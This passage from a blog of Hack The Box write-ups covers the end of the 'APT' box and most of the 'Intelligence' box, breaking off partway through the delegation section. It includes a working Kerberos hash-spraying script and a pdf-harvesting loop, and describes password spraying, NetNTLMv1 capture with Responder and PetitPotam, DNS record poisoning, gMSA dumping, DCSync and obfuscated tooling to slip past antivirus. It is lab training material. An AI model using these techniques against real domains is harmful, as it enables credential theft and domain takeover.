<p><em>But of course,</em> none worked XD</p>

<h2 id="working-around-bruteforce-defenses">Working around bruteforce defenses</h2>

<p>We will now have to check the other users. So we filter them out with some shell fu:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>dump.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'history'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt
<span class="nb">cat </span>dump.txt | <span class="nb">grep</span> <span class="s1">':::'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f4</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> hashes.txt
</code></pre></div></div>

<p>We found around <strong>2k unique users</strong> and <strong>4k unique NTLM hashes</strong>.</p>

<p>We have to first validate that these users exist. We do so using <code class="language-plaintext highlighter-rouge">kerbrute</code></p>

<p>Only 3 users were valid:</p>

<p><img src="/assets/APT/kerberute-userenum.jpg" alt="kerberute-userenum" /></p>

<p><em>When trying to bruteforce the hashes,</em> we get blocked.</p>

<p><img src="/assets/APT/bruteforce-defenses.jpg" alt="bruteforce-defenses" /></p>

<p>But did you notice something? <em>even with that many attempts,</em> the account <strong>didn’t get locked out ;]</strong> we know so because locked out accounts give a <strong>different error message</strong>.</p>

<p>We’re going to try bruteforcing using <strong>Kerberos</strong>. It’s different from using SMB because <strong>it doesn’t leave a 4625 logon event behind.</strong></p>

<p>I had to reset the machine to get the block removed. Perhaps it was configured for a ban time that was too long.</p>

<p>We’re going to do this using impacket’s <code class="language-plaintext highlighter-rouge">getST.py</code> script. By building a bash wrapper around it to enable bruteforcing with a hash since that feature isn’t in <code class="language-plaintext highlighter-rouge">kerbrute</code> at the moment.</p>

<p>Here’s what it looks like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">index</span><span class="o">=</span>1
<span class="k">for </span><span class="nb">hash </span><span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>hashes.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Administrator"</span>
  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/administrator <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>
	<span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Henry.vinson"</span>
  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/Henry.vinson <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>  	
  	<span class="o">((</span><span class="nv">index</span><span class="o">=</span>index+1<span class="o">))</span>
<span class="k">done</span>
</code></pre></div></div>

<p><em>In the script,</em> we request a ticket for SMB access, clear out any unnecessary output as well as print out some progress messages.</p>

<p><strong>Note:</strong> To speed things up, you are advised to break down the hashes list into smaller chunks and run multiple instances of the script in parallel. Or else that process would take significantly much more time.</p>

<p>The <strong>Kerberos bruteforce</strong> worked well and we didn’t get blocked. We got a working hash right near the end of the list (the 3558th entry).</p>

<p><img src="/assets/APT/kerberos-hash-brute.jpg" alt="kerberos-hash-brute" /></p>

<p><strong>Side Note:</strong> <em>After checking the official writeup,</em> I found that this <em>wasn’t the indended way</em>. But hey! it worked XD</p>

<p><img src="/assets/APT/auth-with-henry.jpg" alt="auth-with-henry" /></p>

<h2 id="finding-creds-via-remote-registry">Finding creds via Remote Registry</h2>
<p>Alright. <em>After finally getting our first set of credentials,</em> we sadly don’t find anything to get us further using conventional methods.</p>

<ul>
  <li>Henry didn’t have <em>8</em> access</li>
  <li><strong>Bloodhound</strong> didn’t return anything we could exploit</li>
  <li>No <strong>Kerberoastable</strong> or <strong>ASREProastable</strong> accounts were there</li>
</ul>

<p><em>However, when were looking for information in the registry using impacket’s</em> <code class="language-plaintext highlighter-rouge">reg.py</code>, we found creds for <code class="language-plaintext highlighter-rouge">henry.vinsdon_adm</code> under <code class="language-plaintext highlighter-rouge">HKU\Software\GiganticHostingManagementSystem</code>. It seemed like his administrator account.</p>

<p><img src="/assets/APT/creds-in-registry.jpg" alt="creds-in-registry" /></p>

<p>And he turned out to have <strong>WinRM</strong> access when we checked.</p>

<p><img src="/assets/APT/winrm-shell-access.jpg" alt="winrm-shell-access" /></p>

<h2 id="privilege-escalation-via-netntlmv1">Privilege Escalation via NetNTLMv1</h2>
<p><em>When running the standard</em> <code class="language-plaintext highlighter-rouge">WinPEAS.exe</code>, it got caught by <strong>AV.</strong></p>

<p><img src="/assets/APT/normal-winpeas-caught.jpg" alt="normal-winpeas-caught" /></p>

<p>It worked alright when we switched to the <strong>obfuscated version.</strong> (you can find that on the releases page on GitHub)</p>

<p><img src="/assets/APT/obfuscated-peas-worked.jpg" alt="obfuscated-peas-worked" /></p>

<p><em>Scanning the output,</em> we noticed something exploitable: <strong>NetNTLMv1</strong> being enabled.</p>

<p><img src="/assets/APT/netNTLMv1-enabled.jpg" alt="netNTLMv1-enabled" /></p>

<p><em>Basically,</em> exploiting this aims at <strong>forcing a network authentication from the Domain Controller’s machine account back to our machine</strong> where <code class="language-plaintext highlighter-rouge">responder</code> will capture it for a <strong>crackable NetNTLMv1</strong> hash.</p>

<p>We will first set up our <strong>responder’s configuration</strong> to send a certain challenge. This is for making the hash cracking easier.</p>

<p><em>in</em> <code class="language-plaintext highlighter-rouge">/etc/responder/Responder.conf</code>, we set the challenge to <strong>112233445566778899</strong></p>

<p><img src="/assets/APT/setting-the-challenge.jpg" alt="setting-the-challenge" /></p>

<p>and we start it with the <code class="language-plaintext highlighter-rouge">--lm</code> flag to force LM hashing downgrade.</p>

<p>We then trigger the authentication using <code class="language-plaintext highlighter-rouge">PetitPotam.py</code>. Here’s what it looks like:</p>

<p><img src="/assets/APT/forced-auth-netNTLMv1.jpg" alt="forced-auth-netNTLMv1" /></p>

<p>We got the NetNTLMv1 hash. Which we will then submit to the website <code class="language-plaintext highlighter-rouge">crack.sh</code> after <strong>formatting it according to their requirements</strong>. The hash should be like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</code></pre></div></div>

<p><img src="/assets/APT/crack-sh.jpg" alt="crack-sh" /></p>

<p><em>A few minutes after sumbitting,</em> we got back the NTLM hash for the machine in our inbox.</p>

<p><img src="/assets/APT/crack-sh-results.jpg" alt="crack-sh-results" /></p>

<p><em>Of course,</em> we used the machine hash to do a <strong>DCSync</strong> and grabbed the Administrator’s hash to finish the box :D</p>

<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>A <strong>Windows Domain Controller</strong> that’s hosting a static website on port 80.</li>
  <li><em>While browsing the site,</em> we notice two links to <strong>PDF</strong> files that exist on a web directory for documents.</li>
  <li><em>When checking the naming of the</em> <strong>PDF</strong> <em>files,</em> we notice a date-based scheme. So, we make a list of file names to look for other documents.</li>
  <li>We find a lot of documents containing dummy text. Except for two which included information about a <strong>default password</strong> and about administrative activity going on as well as some hardening.</li>
  <li>We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (<code class="language-plaintext highlighter-rouge">Tiffany.Molina</code>).</li>
  <li><em>While checking Tiffany’s</em> <strong>SMB</strong> <em>share access,</em> we come across a <strong>PowerShell</strong> script on the <strong>“IT”</strong> share that routinely queries <strong>DNS</strong> for record names starting with <strong>“web”</strong> and issues <strong>authenticated</strong> web requests to them.</li>
  <li><em>Knowing this information,</em> we use a tool called <code class="language-plaintext highlighter-rouge">dnstool.py</code> from the <strong>Krbrelayx</strong> toolkit to add a record that starts with <strong>“web”</strong> and points to our Kali machine’s IP address.</li>
  <li><em>Having fired our</em> <code class="language-plaintext highlighter-rouge">responder</code> <em>to capture the</em> <strong>HTTP</strong> <em>request,</em> we wait for a couple of minutes and get the hash of a user called <code class="language-plaintext highlighter-rouge">ted.graves</code> who was running the script.</li>
  <li><em>After running a</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>collection and viewing exploit paths from the users we own,</em> we find that <strong>Ted</strong> can read the <strong>gMSA</strong> password of <code class="language-plaintext highlighter-rouge">SVC_INT</code> which has <strong>constrained delegation</strong> on the Domain Controller.</li>
  <li>We use the <code class="language-plaintext highlighter-rouge">gMSADumper</code> python tool to get the <strong>NTLM hash</strong> of <code class="language-plaintext highlighter-rouge">SVC_INT</code> and use it to request a <strong>silver ticket</strong> impersonating the <code class="language-plaintext highlighter-rouge">Administrator</code> for a full domain takeover.</li>
</ul>

<hr />

<h2 id="nmap">Nmap</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
51310/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
|   date: 2022-06-30T20:31:57
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
</code></pre></div></div>
<p><em>Viewing the port scan results,</em> we notice:</p>

<ol>
  <li>Standard Domain Controller ports: 53, 88, 389 &amp; 445</li>
  <li><strong>WinRM</strong> on port 5985 which is nice for shell access</li>
  <li><strong>IIS 10</strong> on Port 80 that we should take a look at</li>
  <li><em>On the last line,</em> the <strong>Clock Skew</strong> between our host and the DC is 7 hours (which is something we must take care of to make sure anything <strong>Kerberos-related</strong> works well)</li>
</ol>

<h2 id="the-website">The Website</h2>
<p><img src="/assets/Intelligence/website-homepage.jpg" alt="website-homepage" /></p>

<p>checking the website’s home page doesn’t show anything special. Except for this:</p>

<p><img src="/assets/Intelligence/document-links.jpg" alt="document-links" /></p>

<p><em>Upon clicking any of those links,</em> we get directed to a <strong>“documents”</strong> directory.</p>

<p>The content is some filler text. But we notice the naming of the documents is based on dates.</p>

<p><img src="/assets/Intelligence/document-naming.jpg" alt="document-naming" /></p>

<p>This is interesting because:</p>

<ul>
  <li>we want to see if there were <em>other documents</em></li>
  <li><em>And if there were,</em> we want to check their <strong>content</strong> as well as their <strong>metadata</strong></li>
</ul>

<p>we might get information we could use.</p>

<h2 id="searching-documents">Searching Documents</h2>
<p>We’re going to create a script that generates a list of <strong>PDF</strong> file names following the scheme we found.</p>

<p>We’ll make the script generate dates between 2018 to 2022. That’s 2 years before and after the date of the found documents.</p>

<p><strong>Note:</strong> This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I’m only showing this because that’s what I did on my actual run :)</p>

<p><em>Since I am most comfortable with</em> <strong>PowerShell</strong> <em>and since it also runs on</em> <strong>Linux</strong>, I’m going to be using it.</p>

<p>Here’s the script:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">foreach</span><span class="p">(</span><span class="nv">$year</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">2018</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">2022</span><span class="p">)){</span><span class="w">
	</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">12</span><span class="p">)){</span><span class="w">
	        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$month</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$month</span><span class="s2">"</span><span class="p">}</span><span class="w">   </span><span class="c"># if the month's number is less than 10, put a zero before it</span><span class="w">
	        </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">31</span><span class="p">)){</span><span class="w">
	                </span><span class="kr">if</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$day</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$day</span><span class="s2">"</span><span class="p">}</span><span class="w">  </span><span class="c"># if the day's number is less than 10, put a zero before it</span><span class="w">

	                </span><span class="s2">"</span><span class="nv">$year</span><span class="s2">-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">pdf_name_list.txt</span><span class="w"> </span><span class="c"># output the generated name into a text file</span><span class="w">
	        </span><span class="p">}</span><span class="w">
	</span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Which works like a charm :D</p>

<p><img src="/assets/Intelligence/pdf-name-generation.jpg" alt="pdf-name-generation" /></p>

<p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>doc <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>pdf_name_list.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>wget <span class="nt">-q</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$doc</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>

<p>The result is a large list of <strong>PDF</strong>s (99) from that process.</p>

<p>We wanted to find a tool to get us their content in text if possible. So we <strong>Googled</strong> for it:</p>

<p><img src="/assets/Intelligence/searching-for-pdf2text.jpg" alt="searching-for-pdf2text" /></p>

<p><img src="/assets/Intelligence/pdf2text-instructions.jpg" alt="pdf2text-instructions" /></p>

<p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$pdf</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>We end up with 99 text files that we need to browse through :D</p>

<p>Time for another script xD</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>text <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'---------------------'</span><span class="p">;</span> <span class="nb">cat</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'press any key to continue'</span><span class="p">;</span> <span class="nb">read</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>This displays the document names and allows you to browse each.</p>

<p>We find one interesting document: <code class="language-plaintext highlighter-rouge">2020-06-04-upload.txt</code></p>

<p><img src="/assets/Intelligence/second_note.jpg" alt="second_note" /></p>

<p>Which talks about changing the default password: <strong>“NewIntelligenceCorpUser9876”</strong> for new users after logging in.</p>

<p><em>If one of the users still has this password</em>, this could be our way of gaining access.</p>

<p>We also find another document: <code class="language-plaintext highlighter-rouge">2020-12-30-upload.txt</code></p>

<p><img src="/assets/Intelligence/first_note.jpg" alt="first_note" /></p>

<p>It talks about a user <code class="language-plaintext highlighter-rouge">ted</code> (<em>who’s probably in IT</em>) developing a <strong>script</strong> to notify people if a web server goes down.</p>

<p>And it also mentions <strong>“locking down service accounts”</strong> which hints at a <strong>possible security concern</strong> in that area.</p>

<h2 id="interesting-information-in-metadata">Interesting Information in Metadata</h2>
<p>Now we need a list of usernames..</p>

<p><em>With all those</em> <strong>PDF</strong>s <em>lying around,</em> we’re tempted to look for information in <strong>metadata.</strong></p>

<p>Our tool of choice is <code class="language-plaintext highlighter-rouge">exiftool</code></p>

<p>We do a quick sample test on one of the documents:</p>

<p><img src="/assets/Intelligence/creator-metada.jpg" alt="creator-metada" /></p>

<p>We find that there’s a <strong>Creator</strong> field with a possible username in it.</p>

<p>We use the tool with the <code class="language-plaintext highlighter-rouge">-creator</code> flag to only extract that field.</p>

<p>We couple this with some Shell Fu to create a user list:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>exiftool <span class="nt">-creator</span> <span class="nv">$pdf</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">': '</span> <span class="s1">'{print $2}'</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> userlist.txt
</code></pre></div></div>

<p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>

<p>Clean! :D</p>

<p>We then validate those usernames using <a href="https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a></p>

<p><img src="/assets/Intelligence/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>

<p>All 30 users were valid.</p>

<p><em>Before spraying them with the default password,</em> we gotta sync our time with the <strong>Domain Controller</strong> since we’re going to be doing <strong>Kerberos authentication</strong>.</p>

<p>A tool that automates that is <code class="language-plaintext highlighter-rouge">ntpdate</code>. But you have to disable the <strong>Automatic Time Feature</strong> in kali first using <code class="language-plaintext highlighter-rouge">timedatectl set-ntp off</code></p>

<p>We do this and we’re now in sync with the <strong>DC</strong> :]</p>

<p><img src="/assets/Intelligence/remove-clock-skew.jpg" alt="remove-clock-skew" /></p>

<p><img src="/assets/Intelligence/got-tiffany.jpg" alt="got-tiffany" /></p>

<p>Tiffany hadn’t changed the default password. Lucky for us :D</p>

<h2 id="exploiting-the-vulnerable-script">Exploiting the Vulnerable Script</h2>
<p><em>When checking the readable</em> <strong>SMB</strong> <em>shares as Tiffany,</em> we find that she can read a certain share: <strong>IT</strong></p>

<p><img src="/assets/Intelligence/smb-shares-tiffany.jpg" alt="smb-shares-tiffany" /></p>

<p>We connect to it using <code class="language-plaintext highlighter-rouge">smbclient</code> and find the script that the previous note was talking about:</p>

<p><img src="/assets/Intelligence/script.jpg" alt="script" /></p>

<p>When checking its content:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
	</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
		</span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
		</span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
			</span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
		</span><span class="p">}</span><span class="w">
	</span><span class="p">}</span><span class="w">
	</span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>We can see that the script:</p>
<ul>
  <li>Runs every 5 minutes
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Uses the credentials of the user running the script to issue web requests for every record match
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<p><em>In order to exploit this,</em> we need to:</p>
<ol>
  <li>Find a way to put up a <strong>DNS</strong> record that points to our attacker machine</li>
  <li>Start a web server that can capture the <strong>NTLM authentication</strong> sent with the request</li>
</ol>

<p>The answers for both those challenges is <a href="/assets/Intelligence/https://github.com/dirkjanm/krbrelayx">dnstool.py</a> from the <strong>krbrelayx</strong> toolkit and <a href="https://github.com/SpiderLabs/Responder">responder</a></p>

<p><strong><code class="language-plaintext highlighter-rouge">dnstool.py</code></strong> lets us set a <strong>DNS</strong> record if we have valid domain credentials.</p>

<p>We check its help and upload a record that points to our <strong>Kali</strong></p>

<p><img src="/assets/Intelligence/dnstool-usage.jpg" alt="dnstool-usage" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">responder</code></strong> starts a <em>specially-setup</em> HTTP server that will capture the <strong>NTLMv2</strong> hash of the incoming request.</p>

<p>We will start it specifying our <strong>VPN</strong> tunnel interface: <code class="language-plaintext highlighter-rouge">responder -I tun0</code></p>

<p><em>After a few minutes,</em> we get an <strong>NTLMv2</strong> hash for the <code class="language-plaintext highlighter-rouge">Ted.Graves</code> user.</p>

<p><img src="/assets/Intelligence/captured-hash.jpg" alt="captured-hash" /></p>

<p>We could successfully crack it using <code class="language-plaintext highlighter-rouge">john</code></p>

<p><img src="/assets/Intelligence/teddys-hash-cracked.jpg" alt="teddys-hash-cracked" /></p>

<h2 id="bloodhound-and-the-path-to-domain-admin">Bloodhound and the Path to Domain Admin</h2>
<p><em>After running the</em> <strong>Bloodhound</strong> <em>python Ingestor</em> <a href="/assets/Intelligence/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">Bloodhound.py</code></a>, we mark our user <code class="language-plaintext highlighter-rouge">Ted.Graves</code> as owned.</p>

<p>We see a <strong>clear exploit path</strong> to <strong>Domain Admin</strong> when we view the results of the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code> built-in query:</p>

<p><img src="/assets/Intelligence/bloodhound-path-to-da.jpg" alt="bloodhound-path-to-da" /></p>

<ol>
  <li><strong>Ted</strong> can read the password for <code class="language-plaintext highlighter-rouge">SVC_INT$</code></li>
  <li><code class="language-plaintext highlighter-rouge">SVC_INT$</code> has <strong>Constrained Delegation</strong> over the Domain Controller (which we will talk about in the next section).</li>
</ol>

<p>Let’s first get the <strong>NTLM</strong> hash for the <code class="language-plaintext highlighter-rouge">SVC_INT$</code> group-managed service account.</p>

<p>we can do so using <a href="/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>

<p><img src="/assets/Intelligence/gMSADumped.jpg" alt="gMSADumped" /></p>

<p>We’re now good for the next step.</p>

<h2 id="abusing-constrained-delegation">Abusing Constrained Delegation</h2>
<p><em>In our case,</em> <code class="language-plaintext highlighter-rouge">SVC_INT$</code> is allowed delegation to the Domain Controller.</p>

<p>This means that it can <strong>impersonate any user</strong> (even Administrators) when interacting with the DC as the <strong>WWW</strong> service.</p>

<p>We know so by inspecting the account on <code class="language-plaintext highlighter-rouge">bloodhound</code></p>

<p><img src="/assets/Intelligence/allowed-to-delegate.jpg" alt="allowed-to-delegate" /></p>

